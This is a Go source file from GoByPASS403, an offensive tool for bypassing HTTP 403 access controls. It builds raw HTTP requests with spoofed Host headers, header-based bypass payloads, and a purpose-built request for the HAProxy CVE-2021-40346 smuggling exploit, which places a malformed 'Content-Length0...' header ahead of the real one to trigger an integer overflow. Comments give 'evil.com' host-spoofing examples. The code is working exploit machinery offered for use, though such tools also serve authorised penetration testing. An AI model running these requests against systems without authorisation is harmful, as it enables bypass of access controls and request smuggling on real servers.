/*
GoByPASS403
Author: slicingmelon <github.com/slicingmelon>
X: x.com/pedro_infosec
*/
package rawhttp

import (
	"bufio"
	"bytes"
	"strconv"
	"strings"
	"sync"

	"github.com/slicingmelon/gobypass403/core/engine/payload"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"

	"github.com/VictoriaMetrics/VictoriaMetrics/lib/bytesutil"
	"github.com/valyala/fasthttp"
)

var (
	strUserAgentHeader = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
)

var (
	requestBufferPool = bytesutil.ByteBufferPool{}

	rawRequestBuffReaderPool = sync.Pool{
		New: func() any {
			return bufio.NewReader(nil)
		},
	}
)

/*
Crucial information

Client determines the server to be requested in the following order:

  - from RequestURI if it contains full url with scheme and host;
  - from Host header otherwise.

The function doesn't follow redirects. Use Get* for following redirects.
Response is ignored if resp is nil.

The detination/target URL is built based on req.URI, aka where the request will be sent to.

Use req.URI().SetScheme("https") to set the scheme to https
Use req.URI().SetHost("example.com") to set the target host -> this is where the request will be sent to
Use req.SetRequestURI("/path") to set the path (e.g., / or /ssdaf).

For spoofed/custom Host header!
Set req.UseHostHeader = true to ensure the custom Host header is used instead of the URI host (fasthttp will extract it from the URI)
Use req.Header.Set("Host", "evil.com") to set the spoofed Host header

To set true raw request line, e.g. GET @evil.com HTTP/1.1, do not set req.SetRequestURI() and write the raw request line manually.

For this to work, everything must be set in order, Raw Request line, headers, then appply settings,
then set req.UseHostHeader = true and then req.URI().SetScheme() and req.URI().SetHost()
*/

// BuildHAProxyRawRequest constructs a raw HTTP request specifically for the HAProxy CVE-2021-40346 exploit
// This function creates the request with headers in a very specific order required for the exploit to work:
// 1. First the malformed header (Content-Length0aaa...)
// 2. Then the regular Content-Length header
// The order is critical for the exploit to trigger the integer overflow
func BuildHAProxyRawRequest(bypassPayload payload.BypassPayload) []byte {
	// Get ByteBuffer from pool
	bb := requestBufferPool.Get()
	defer requestBufferPool.Put(bb)

	// Build request line directly into byte buffer
	bb.B = append(bb.B, bypassPayload.Method...)
	bb.B = append(bb.B, ' ')
	bb.B = append(bb.B, bypassPayload.RawURI...)
	bb.B = append(bb.B, " HTTP/1.1\r\n"...)

	// Host header must be added (necessary for proper routing)
	hostValue := bypassPayload.Host
	for _, h := range bypassPayload.Headers {
		if strings.EqualFold(h.Header, "Host") {
			hostValue = h.Value
			break
		}
	}
	bb.B = append(bb.B, "Host: "...)
	bb.B = append(bb.B, hostValue...)
	bb.B = append(bb.B, "\r\n"...)

	// Add User-Agent header
	bb.B = append(bb.B, strUserAgentHeader...)
	bb.B = append(bb.B, "\r\n"...)

	// CRITICAL: Now find and add our malformed Content-Length header
	// This MUST come before the regular Content-Length header
	var malformedHeader string
	var contentLengthValue string
	var connectionValue = "keep-alive"

	// Locate the critical headers from our payload
	for _, h := range bypassPayload.Headers {
		if strings.HasPrefix(strings.ToLower(h.Header), "content-length0") {
			malformedHeader = h.Header
		} else if strings.EqualFold(h.Header, "Content-Length") {
			contentLengthValue = h.Value
		} else if strings.EqualFold(h.Header, "Connection") {
			connectionValue = h.Value
		}
	}

	// First add the malformed header - MUST BE FIRST for the exploit to work
	if malformedHeader != "" {
		if strings.HasSuffix(malformedHeader, ":") {
			bb.B = append(bb.B, malformedHeader...) // Already has colon
			bb.B = append(bb.B, "\r\n"...)
		} else {
			bb.B = append(bb.B, malformedHeader...)
			bb.B = append(bb.B, ": \r\n"...) // Empty value
		}
	}

	// Then add the regular Content-Length - MUST BE SECOND
	bb.B = append(bb.B, "Content-Length: "...)
	if contentLengthValue != "" {
		bb.B = append(bb.B, contentLengthValue...)
	} else {
		bb.B = append(bb.B, []byte(strconv.Itoa(len(bypassPayload.Body)))...)
	}
	bb.B = append(bb.B, "\r\n"...)

	// Other standard headers
	// 1. Accept
	bb.B = append(bb.B, "Accept: */*\r\n"...)

	// 2. Debug token if enabled
	if GB403Logger.IsDebugEnabled() {
		bb.B = append(bb.B, "X-GB403-Token: "...)
		bb.B = append(bb.B, bypassPayload.PayloadToken...)
		bb.B = append(bb.B, "\r\n"...)
	}

	// 3. Connection header
	bb.B = append(bb.B, "Connection: "...)
	bb.B = append(bb.B, connectionValue...)
	bb.B = append(bb.B, "\r\n"...)

	// End headers marker
	bb.B = append(bb.B, "\r\n"...)

	// Add body
	if len(bypassPayload.Body) > 0 {
		bb.B = append(bb.B, bypassPayload.Body...)
	}

	// Store the raw request for debugging
	rawRequest := make([]byte, len(bb.B))
	copy(rawRequest, bb.B)

	// Debug log the raw request
	GB403Logger.Debug().Msgf("RAW HAProxy Request:\n%s", string(rawRequest))

	return rawRequest
}

func BuildRawHTTPRequest(httpclient *HTTPClient, req *fasthttp.Request, bypassPayload payload.BypassPayload) error {
	// Define shouldCloseConn based on general factors
	shouldCloseConn := httpclient.GetHTTPClientOptions().DisableKeepAlive ||
		httpclient.GetHTTPClientOptions().ProxyURL != "" ||
		bypassPayload.BypassModule == "headers_scheme" ||
		bypassPayload.BypassModule == "headers_ip" ||
		bypassPayload.BypassModule == "headers_port" ||
		bypassPayload.BypassModule == "headers_url" ||
		bypassPayload.BypassModule == "headers_host"

	// Special case for HAProxy bypass
	if bypassPayload.BypassModule == "haproxy" {
		// For HAProxy exploit, build the request manually with headers in exact order
		rawRequest := BuildHAProxyRawRequest(bypassPayload)

		// Set up minimal request properties needed for connection
		req.URI().DisablePathNormalizing = true
		req.URI().SetScheme(bypassPayload.Scheme)
		req.URI().SetHost(bypassPayload.Host)

		// Store the raw payload so doer.go can send it exactly as constructed
		req.SetBodyRaw(rawRequest)
		req.Header.Set("X-GB403-HAProxy-Raw", "true")

		return nil
	}

	// Normal case (non-HAProxy) continues below

	// Get ByteBuffer from pool
	bb := requestBufferPool.Get()
	defer requestBufferPool.Put(bb)

	// Build request line directly into byte buffer
	bb.B = append(bb.B, bypassPayload.Method...)
	bb.B = append(bb.B, ' ')
	bb.B = append(bb.B, bypassPayload.RawURI...)
	bb.B = append(bb.B, " HTTP/1.1\r\n"...)

	// Track headers we've seen and will add
	currentShouldCloseConn := shouldCloseConn
	_ = currentShouldCloseConn // Used later in the function, acknowledge to satisfy linter

	hasHostHeader := false       // Will be true if Host is written
	hasContentLength := false    // Tracks if a normal Content-Length is set and written
	hasConnectionHeader := false // Tracks if Connection is set and written
	_ = hasContentLength         // Used later in the function, acknowledge to satisfy linter
	_ = hasConnectionHeader      // Used later in the function, acknowledge to satisfy linter

	// Create a map to track which custom headers from client options we will add
	clientCustomHeadersMap := make(map[string]string)
	clientOpts := httpclient.GetHTTPClientOptions()
	if len(clientOpts.CustomHTTPHeaders) > 0 {
		for _, header := range clientOpts.CustomHTTPHeaders {
			colonIdx := strings.Index(header, ":")
			if colonIdx != -1 {
				headerName := strings.TrimSpace(header[:colonIdx])
				headerValue := strings.TrimSpace(header[colonIdx+1:])
				clientCustomHeadersMap[strings.ToLower(headerName)] = headerValue
			}
		}
	}

	// --- BEGIN Prioritized Header Writing ---
	handledByPriorityLogic := make(map[string]bool) // Tracks headers written in this section

	// 1. Host Header (Payload -> Custom -> Default)
	hostFromPayload := ""
	for _, h := range bypassPayload.Headers {
		if strings.EqualFold(h.Header, "Host") {
			hostFromPayload = h.Value
			break
		}
	}
	if hostFromPayload != "" {
		bb.B = append(bb.B, "Host: "...)
		bb.B = append(bb.B, hostFromPayload...)
		bb.B = append(bb.B, "\r\n"...)
		hasHostHeader = true
		delete(clientCustomHeadersMap, "host") // Remove from custom map as payload took precedence
	} else if customHost, exists := clientCustomHeadersMap["host"]; exists {
		bb.B = append(bb.B, "Host: "...)
		bb.B = append(bb.B, customHost...)
		bb.B = append(bb.B, "\r\n"...)
		hasHostHeader = true
	} else {
		bb.B = append(bb.B, "Host: "...)
		bb.B = append(bb.B, bypassPayload.Host...)
		bb.B = append(bb.B, "\r\n"...)
		hasHostHeader = true
	}
	handledByPriorityLogic["host"] = true
	_ = hasHostHeader // Acknowledge use to satisfy linter, as its main role here is to confirm writing.

	// 2. User-Agent Header (Payload -> Custom -> Default)
	uaFromPayload := ""
	uaHeaderFromPayload := ""
	for _, h := range bypassPayload.Headers {
		if strings.EqualFold(h.Header, "User-Agent") {
			uaFromPayload = h.Value
			uaHeaderFromPayload = h.Header // Preserve original casing from payload
			break
		}
	}
	if uaFromPayload != "" {
		bb.B = append(bb.B, uaHeaderFromPayload...)
		bb.B = append(bb.B, ": "...)
		bb.B = append(bb.B, uaFromPayload...)
		bb.B = append(bb.B, "\r\n"...)
		delete(clientCustomHeadersMap, "user-agent")
	} else if customUA, exists := clientCustomHeadersMap["user-agent"]; exists {
		bb.B = append(bb.B, "User-Agent: "...) // Defaulting to standard casing
		bb.B = append(bb.B, customUA...)
		bb.B = append(bb.B, "\r\n"...)
	} else {
		bb.B = append(bb.B, strUserAgentHeader...)
		bb.B = append(bb.B, "\r\n"...)
	}
	handledByPriorityLogic["user-agent"] = true

	// 3. Accept Header (Payload -> Custom -> Default)
	acceptFromPayload := ""
	acceptHeaderFromPayload := ""
	for _, h := range bypassPayload.Headers {
		if strings.EqualFold(h.Header, "Accept") {
			acceptFromPayload = h.Value
			acceptHeaderFromPayload = h.Header
			break
		}
	}
	if acceptFromPayload != "" {
		bb.B = append(bb.B, acceptHeaderFromPayload...)
		bb.B = append(bb.B, ": "...)
		bb.B = append(bb.B, acceptFromPayload...)
		bb.B = append(bb.B, "\r\n"...)
		delete(clientCustomHeadersMap, "accept")
	} else if customAccept, exists := clientCustomHeadersMap["accept"]; exists {
		bb.B = append(bb.B, "Accept: "...) // Defaulting to standard casing
		bb.B = append(bb.B, customAccept...)
		bb.B = append(bb.B, "\r\n"...)
	} else {
		bb.B = append(bb.B, "Accept: */*\r\n"...)
	}
	handledByPriorityLogic["accept"] = true

	// 4. X-GB403-Token Header (Payload -> Custom -> Default, if debug)
	if GB403Logger.IsDebugEnabled() {
		tokenFromPayload := ""
		tokenHeaderFromPayload := ""
		for _, h := range bypassPayload.Headers {
			if strings.EqualFold(h.Header, "X-GB403-Token") {
				tokenFromPayload = h.Value
				tokenHeaderFromPayload = h.Header
				break
			}
		}
		if tokenFromPayload != "" {
			bb.B = append(bb.B, tokenHeaderFromPayload...)
			bb.B = append(bb.B, ": "...)
			bb.B = append(bb.B, tokenFromPayload...)
			bb.B = append(bb.B, "\r\n"...)
			delete(clientCustomHeadersMap, "x-gb403-token")
		} else if customToken, exists := clientCustomHeadersMap["x-gb403-token"]; exists {
			bb.B = append(bb.B, "X-GB403-Token: "...) // Defaulting to standard casing
			bb.B = append(bb.B, customToken...)
			bb.B = append(bb.B, "\r\n"...)
		} else {
			bb.B = append(bb.B, "X-GB403-Token: "...)
			bb.B = append(bb.B, bypassPayload.PayloadToken...)
			bb.B = append(bb.B, "\r\n"...)
		}
	}
	handledByPriorityLogic["x-gb403-token"] = true // Mark even if not debug, so main loops skip it.
	// --- END Prioritized Header Writing ---

	// Add remaining payload-specific headers (excluding those handled above)
	for _, h := range bypassPayload.Headers {
		if _, handled := handledByPriorityLogic[strings.ToLower(h.Header)]; handled {
			continue
		}

		// Check if this header is going to be overridden by a client custom header
		// (unless it's a critical exploit header like CL, Connection for this specific payload context)
		_, willBeOverriddenByCustom := clientCustomHeadersMap[strings.ToLower(h.Header)]

		if willBeOverriddenByCustom &&
			!(strings.EqualFold(h.Header, "Content-Length") || // Allow payload CL
				strings.HasPrefix(strings.ToLower(h.Header), "content-length0") || // Allow overflow CL
				strings.EqualFold(h.Header, "Connection")) { // Allow payload Connection
			continue
		}

		// Do NOT set the main `hasContentLength` flag here for payload's Content-Length.
		// That flag is for the true Content-Length of the entire body.
		// Exploit-specific CLs from payload are written, but don't satisfy the main flag.
		if strings.HasPrefix(strings.ToLower(h.Header), "content-length0") {
			// Ensure custom map doesn't override this specific exploit header if it coincidentally exists there
			delete(clientCustomHeadersMap, strings.ToLower(h.Header))
		} else if strings.EqualFold(h.Header, "Connection") {
			hasConnectionHeader = true // This flag IS for the final Connection header
			if strings.EqualFold(h.Value, "close") {
				currentShouldCloseConn = true
			} else if strings.EqualFold(h.Value, "keep-alive") {
				currentShouldCloseConn = false
			}
			delete(clientCustomHeadersMap, "connection")
		} else if strings.EqualFold(h.Header, "Content-Length") {
			// This header from payload might be an exploit-specific CL or the true body CL.
			// Ensure it is not overridden by a generic custom CL later if names collide.
			delete(clientCustomHeadersMap, "content-length")
			// Check if this payload-provided CL is the correct length for the entire body.
			if h.Value == strconv.Itoa(len(bypassPayload.Body)) {
				hasContentLength = true // Mark that the true Content-Length is now set by the payload.
			}
		}

		// Append the header from the payload
		// Special handling for headers like "Content-Length0...a:" which should have an empty value part
		if strings.HasSuffix(h.Header, ":") && h.Value == "" {
			bb.B = append(bb.B, h.Header...) // Header name already includes the colon
			bb.B = append(bb.B, "\r\n"...)
		} else {
			bb.B = append(bb.B, h.Header...)
			bb.B = append(bb.B, ": "...)
			bb.B = append(bb.B, h.Value...)
			bb.B = append(bb.B, "\r\n"...)
		}
	}

	// Now add any client custom headers that weren't in the payload or handled by priority logic
	for headerNameLower, headerValue := range clientCustomHeadersMap {
		if _, handled := handledByPriorityLogic[headerNameLower]; handled {
			continue
		}

		// Capitalize first letter of each word for standard HTTP header format
		words := strings.Split(headerNameLower, "-")
		for i := range words {
			if len(words[i]) > 0 {
				words[i] = strings.ToUpper(words[i][:1]) + words[i][1:]
			}
		}
		headerName := strings.Join(words, "-")

		// Append the custom header
		bb.B = append(bb.B, headerName...)
		bb.B = append(bb.B, ": "...)
		bb.B = append(bb.B, headerValue...)
		bb.B = append(bb.B, "\r\n"...)

		// If this custom header IS the true Content-Length or Connection, update flags
		if strings.EqualFold(headerName, "Content-Length") {
			// Only set hasContentLength if this custom CL is the correct one for the WHOLE body
			if headerValue == strconv.Itoa(len(bypassPayload.Body)) {
				hasContentLength = true
			}
		} else if strings.EqualFold(headerName, "Connection") {
			hasConnectionHeader = true
			if strings.EqualFold(headerValue, "close") {
				currentShouldCloseConn = true
			} else if strings.EqualFold(headerValue, "keep-alive") {
				currentShouldCloseConn = false
			}
		}
	}

	// End of ALL headers marker
	bb.B = append(bb.B, "\r\n"...)

	// Add body if present
	if len(bypassPayload.Body) > 0 {
		bb.B = append(bb.B, bypassPayload.Body...)
	}

	// Get bufio.Reader from pool and reset it with our ByteBuffer reader
	br := rawRequestBuffReaderPool.Get().(*bufio.Reader)
	br.Reset(bytes.NewReader(bb.B))
	defer rawRequestBuffReaderPool.Put(br)

	req.URI().DisablePathNormalizing = true
	req.Header.DisableNormalizing()

	// Let FastHTTP parse the entire request (headers + body)
	if err := req.ReadLimitBody(br, 0); err != nil {
		return err
	}

	// Set URI components after successful parsing
	req.URI().DisablePathNormalizing = true
	req.Header.DisableNormalizing()
	req.Header.SetNoDefaultContentType(true)
	req.UseHostHeader = true

	req.URI().SetScheme(bypassPayload.Scheme)
	req.URI().SetHost(bypassPayload.Host)

	// Debug log the final raw request string
	GB403Logger.Debug().Msgf("Constructed Raw Request:\n%s", req.String())

	return nil
}

func applyReqFlags(req *fasthttp.Request) {
	req.URI().DisablePathNormalizing = true
	req.Header.DisableNormalizing()
	req.Header.SetNoDefaultContentType(true)
	req.UseHostHeader = true
}

func ReqCopyToWithSettings(src *fasthttp.Request, dst *fasthttp.Request) *fasthttp.Request {
	// Copy basic request data
	src.CopyTo(dst)

	// Log initial state after copy
	//GB403Logger.Debug().Msgf("After CopyTo - scheme=%s host=%s",
	//	src.URI().Scheme(), src.URI().Host()) // Use bytes directly in logging

	applyReqFlags(dst)

	// Store original values as []byte
	originalScheme := src.URI().Scheme()
	originalHost := src.URI().Host()

	//GB403Logger.Debug().Msgf("Original values - scheme=%s host=%s",
	//	originalScheme, originalHost) // Use bytes directly in logging

	// Use byte variants to avoid allocations
	dst.URI().SetSchemeBytes(originalScheme)
	dst.URI().SetHostBytes(originalHost)

	// Check if Host header exists using case-insensitive lookup
	if len(PeekRequestHeaderKeyCaseInsensitive(dst, strHostHeader)) == 0 {
		//GB403Logger.Debug().Msgf("No Host header found, setting from URI.Host: %s", originalHost)
		dst.Header.SetHostBytes(originalHost)
	}

	// GB403Logger.Debug().Msgf("After SetScheme/SetHost - scheme=%s host=%s header_host=%s",
	// 	dst.URI().Scheme(), dst.URI().Host(),
	// 	PeekRequestHeaderKeyCaseInsensitive(dst, hostKey))

	return dst
}

func PeekRequestHeaderKeyCaseInsensitive(h *fasthttp.Request, key []byte) []byte {
	var result []byte
	h.Header.VisitAll(func(k, v []byte) {
		if result == nil && bytes.EqualFold(k, key) {
			result = v
		}
	})
	return result
}
